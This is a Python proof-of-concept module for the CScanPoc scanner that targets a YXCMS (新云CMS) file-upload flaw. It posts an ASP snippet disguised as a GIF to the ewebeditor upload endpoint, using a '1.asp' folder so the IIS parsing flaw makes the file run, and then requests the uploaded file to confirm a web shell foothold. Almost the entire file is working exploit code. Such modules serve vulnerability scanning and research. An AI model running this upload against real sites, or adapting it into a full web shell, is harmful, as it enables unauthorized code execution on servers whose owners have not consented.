# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'YXCMS_0003'  # 平台漏洞编号，留空
    name = 'YXCMS 文件上传getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2014-09-24'  # 漏洞公布时间
    desc = '''
        YXCMS(新云CMS)建站系统存在ewebeditor上传和iis解析漏洞，可批量getshell。
        利用ewebeditor上传漏洞可以新建一个1.asp的文件夹，再配合iis的解析漏洞就可以成功的拿到shell.
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/27317.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YXCMS(新云CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0aec51de-9eb7-4f61-8b68-9ce10898b99f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # _refer_= http://www.wooyun.org/bugs/wooyun-2014-077161
            hh = hackhttp.hackhttp()
            url = self.target + \
                '/admin/xyeWebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=1.asp'
            payload = '-----------------------------20537215486483\r\n'
            payload += 'Content-Disposition: form-data; name="uploadfile"; filename="1.gif"\r\n'
            payload += 'Content-Type: image/gif\r\n\r\n'
            payload += '<%response.write("ok")%>\r\n\r\n\r\n'
            payload += '-----------------------------20537215486483--\r\n'
            payload_len = len(payload)

            head = "Content-Type: multipart/form-data; boundary=----20537215486483\r\n"
            head += "Connection: Close\r\n"
            head += "Content-Length: %d" % payload_len + '\r\n\r\n'

            code, head, body, ecode, redirct_url = hh.http(
                url, headers=head, data=payload)
            if code == 200:
                shell = re.findall("Saved\(\'(.+?.gif)", body)
                if shell:
                    aspurl = self.target + '../' + shell[0]
                    code, head, body, ecode, redirect_url = hh.http(aspurl)
                    if code == 200:
                        #security_hole('upload vulnerable:%s' % aspurl)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                    # else:
                        #security_info('maybe vulnerable:%s' % aspurl)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
